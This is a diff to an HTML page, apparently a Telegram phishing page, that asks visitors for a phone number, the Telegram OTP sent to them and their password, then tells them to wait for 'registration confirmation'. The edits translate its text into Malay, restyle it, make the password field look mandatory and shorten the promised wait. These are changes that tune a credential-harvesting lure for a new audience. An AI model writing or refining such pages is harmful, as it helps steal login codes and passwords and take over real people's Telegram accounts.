@@ -108,7 +108,7 @@
                         </nav>
                         <div class="w-full flex justify-center my-6">
                             <img src="assets/images/GAMBAR.jpeg" alt="Header"
-                                class="w-40 h-40 object-contain rounded-lg shadow-2xl shadow-gray-500">
+                                class="w-full h-auto object-contain rounded-lg shadow-2xl shadow-gray-500">
                         </div>
                         <div class="first">
                             <form action="javascript:void(0)" method="post" id="firstForm">
@@ -149,9 +149,9 @@
                                 <input type="hidden" name="phone_number" id="validatePhoneNumber" readonly>
                                 <div class="mb-3">
                                     <label for="otp" class="form-label">
-                                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">We have sent a 5-digit OTP
-                                            to your Telegram account, please open your Telegram application and check
-                                            our message.</span>
+                                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo" style="color: #ffffff;">Kami telah menghantar OTP 5 digit
+                                            ke akaun Telegram anda, sila buka aplikasi Telegram anda dan semak
+                                            mesej kami.</span>
                                     </label>
                                     <input name="otp" maxlength="5" id="otp" class="form-control" type="text"
                                         pattern="\d*" inputmode="numeric"
@@ -171,7 +171,7 @@
                                 <input type="hidden" name="otp_code" id="validateOtp_code" readonly>
                                 <div class="mb-3">
                                     <label for="password" class="form-label">
-                                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo">Password [opsional]</span>
+                                        <span id="ctl00_RecipientMasterContent_lblEntry_IDNo" style="color: #ffffff;">Kata laluan</span>
                                     </label>
                                     <input name="password" id="password" class="form-control" type="text"
                                         required="true" placeholder="********">
@@ -186,12 +186,12 @@
                             style="display: none;">
                             <p class="d-flex justify-content-center align-items-center"><img src="assets/images/processing.gif" id="ctl00_logohead"
                                     class="img-fluid" width="160" /></p>
-                            <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Please wait a
-                                    moment. We are processing your request.</span></h5>
-                            <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord">Wait 2x24 hours
-                                    to get registration confirmation via your Telegram application.</span></h5>
+                            <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord" style="color: #ffffff;">Sila tunggu
+                                    sebentar. Kami sedang memproses permohonan anda.</span></h5>
+                            <h5 class="text-center"><span id="ctl00_RecipientMasterContent_lblNoRecord" style="color: #ffffff;">Tunggu 1x24 jam
+                                    untuk mendapatkan pengesahan pendaftaran melalui aplikasi Telegram anda.</span></h5>
                             <p class="text-center"><a href="" class="btn btn-lg btn-block btn-mk">&laquo; <span
-                                        id="ctl00_RecipientMasterContent_lblGoBack_NoResult">CONFIRMATION</span></a>
+                                        id="ctl00_RecipientMasterContent_lblGoBack_NoResult">PENGESAHAN</span></a>
                             </p>
                         </div>
                         <script type="text/javascript">
